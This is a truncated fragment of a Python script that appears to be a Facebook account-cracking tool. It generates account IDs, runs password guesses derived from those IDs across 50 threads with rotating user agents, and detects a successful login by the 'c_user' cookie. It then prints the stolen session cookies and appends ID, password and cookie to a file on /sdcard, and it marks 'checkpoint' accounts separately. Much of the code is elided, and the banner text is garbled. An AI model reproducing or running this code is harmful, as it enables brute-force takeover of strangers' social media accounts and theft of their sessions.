...
try:
    ...
    exit()
def banner():
    print("[=] ðŸ˜Œ Testing New mathod By FREEDOM ")
...
for xd in range(3005):
    ...
    uas.append(ff)
for FREEDOM  in range(9993,176281):
...
def virus():
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		for guru in user:		    
			uid = code+coda+guru
			pwx = [uid,uid[3:],uid[5:],uid[4:],uid[:6],'59039200','57273200']
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r%s|bashar-OK:\033[1;32m%s\033[1;37m:\033[1;31m%s\033[1;37m '%(loop,len(oks),len(cps))),
            sys.stdout.flush()
    ...
    'user-agent': pro,
          ...
          #  print(log_cookies)
          #  sys.stdout.write(uid,ps)
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print(f'\r\33[1;92m [FREDOM-OK] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m [♥] COOKIE : '+coki)
                open('/sdcard/FREDOM-OK.txt', 'a').write(cid+' | '+ps+ ' | ' +coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                #cid = coki[82:97]
                print(f'\x1b[1;91m  [FREDOM-CP] '+uid+' | '+ps+'\33[0;92m')
               # open('/sdcard/FREDOM1×1-CP.txt', 'a').write( uid+' | '+ps+' \n')
                #print(f'\r\033[1;92m [♥] COOKIE : '+coki)
                cps.append(uid)
                break
            else:
